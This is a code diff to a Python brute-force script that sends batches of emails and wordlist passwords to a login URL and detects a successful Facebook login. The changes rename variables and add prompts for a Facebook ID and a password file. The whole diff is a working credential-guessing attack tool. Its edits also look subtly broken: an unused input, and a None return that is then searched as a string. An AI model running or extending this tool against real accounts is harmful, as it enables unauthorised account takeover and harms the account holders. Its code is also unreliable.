@@ -15,7 +15,7 @@ class bcolors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
-def banner(argv, usage=False, url=None, users=None):
+def banner(argv, usage=False, url=None, emails=None):
     print(bcolors.OKBLUE + " __      __                        .___                                             " + bcolors.ENDC)
     print(bcolors.OKBLUE + "/  \    /  \   ____   _______    __| _/ ______   _______    ____     ______   ______" + bcolors.ENDC)
     print(bcolors.OKBLUE + "\   \/\/   /  /  _ \  \_  __ \  / __ |  \____ \  \_  __ \ _/ __ \   /  ___/  /  ___/" + bcolors.ENDC)
@@ -26,7 +26,7 @@ def banner(argv, usage=False, url=None, users=None):
     print(bcolors.OKBLUE +
           "        \ /       _  _  __    _  _    ___ __    __ _  _  __ __" + bcolors.ENDC)
     print(bcolors.OKBLUE +
-          "         X |V||  |_)|_)/     |_)|_)| | | |_    |_ / \|_)/  |_" + bcolors.ENDC)
+          "         X |V||  |_)|_)/     |_)|_)| | | |_    |_ / \|_)/  |_ " + bcolors.ENDC)
     print(bcolors.OKBLUE +
           '        / \| ||__| \|  \__   |_)| \|_| | |__   |  \_/| \\\__|__' + bcolors.ENDC)
     print(bcolors.OKBLUE + "" + bcolors.ENDC)
@@ -39,7 +39,7 @@ def banner(argv, usage=False, url=None, users=None):
         sys.exit(0)
     else:
         print(bcolors.WARNING + "+ -- --=[Brute forcing target: " +
-              url + " with emails: " + str(users) + "" + bcolors.ENDC)
+              url + " with emails: " + str(emails) + "" + bcolors.ENDC)
 
 def send_request(url, data):
     req = requests.post(url, data)
@@ -65,9 +65,9 @@ def template(entries):
 
 def attack(entries):
     if len(entries) < 1:
-        return None
+        return
     t = template(entries)
-    return send_request(url, t) or ""
+    return send_request(url, t)
 
 def find_one(entries):
     for entry in entries:
@@ -85,19 +85,25 @@ if __name__ == '__main__':
 
     banner(sys.argv, False, url, emails)
 
+    facebook_id = input("Enter Facebook ID: ")
+    password_file = input("Enter the password file name: ")
+
     with open(wordlist, 'r') as f:
         passwds = f.read().splitlines()
 
     entries = []
     for email in emails:
-        print("email: %s" % email)
+        print("email: {}".format(email))
         for num in range(0, len(passwds)):
             if len(entries) == PASSWD_PER_REQUEST:
                 if "Welcome to Facebook" in attack(entries):
                     find_one(entries)
                 entries = []
                 time.sleep(WAIT_TIME)
-            entries.append({"email": email, "passwd": passwds[num]})
+
+            entries.append({"email": email, "passwd": passwds[num], "id": facebook_id})
+            
         if "Welcome to Facebook" in attack(entries):
             find_one(entries)
+
         entries = []
